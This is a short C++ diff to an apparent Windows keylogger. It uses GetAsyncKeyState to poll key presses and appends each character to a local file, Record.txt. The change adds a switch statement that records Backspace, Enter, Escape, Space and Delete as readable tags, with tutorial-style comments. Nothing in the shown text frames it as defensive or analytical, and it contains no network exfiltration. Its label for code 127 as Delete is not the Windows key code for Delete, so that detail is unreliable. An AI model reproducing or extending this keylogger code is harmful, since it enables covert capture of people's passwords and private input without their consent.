@@ -30,8 +30,34 @@ void Log(void){
                 // GetAsyncKeyState checks if a specific key was pressed.
                 // -32767 indicates a key press event.
                 std::ofstream write("Record.txt", std::ios::app); // ios::app ensures that the file is opened in append mode.
-                write << character;
-                write.close(); // closing the file.
+                
+                switch(character)
+                {
+                    case 8: // 8 means backspace.
+                    {
+                        write<<" <Backspace> ";
+                    }break;
+                    case 13: // 13 is for tthe "Enter Key"
+                    {
+                        write<<" <Enter> "<<std::endl;
+                    }break;
+                    case 27: // 27 is for the "Escape key"
+                    {
+                        write << " <ESC> ";
+                    }break;
+                    case 32: // 32 is for the "Space key"
+                    {
+                        write << " <Space> ";
+                    }break;
+                    case 127: // 127 is for the "Delete key"
+                    {
+                        write <<" <Delete> ";
+                    }break;
+                    default :
+                    {
+                        write <<character;
+                    }
+                }
             }
         }
     }
